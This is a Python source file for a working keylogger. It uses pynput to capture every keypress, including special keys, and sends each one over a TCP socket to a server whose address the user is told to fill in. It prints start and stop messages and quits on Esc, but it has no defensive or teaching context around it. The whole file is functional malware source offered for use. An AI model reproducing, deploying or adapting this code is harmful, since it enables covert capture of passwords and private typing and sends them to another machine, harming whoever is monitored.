from pynput import keyboard
import socket

# Server configuration (Your device's IP address and port)
SERVER_HOST = "127.0.0.1"  # Replace with your device's IP
SERVER_PORT = 8080

def send_keylog(data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            client_socket.sendall(data.encode("utf-8"))
    except Exception as e:
        print(f"Error: {e}")

def on_press(key):
    try:
        # Log alphanumeric keys directly
        if hasattr(key, 'char') and key.char is not None:
            send_keylog(key.char)
        # Log special keys with brackets
        else:
            send_keylog(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the keylogger when Esc is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

def main():
    print("Starting keylogger... Press 'Esc' to stop.")
    # Create a listener for keyboard events
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
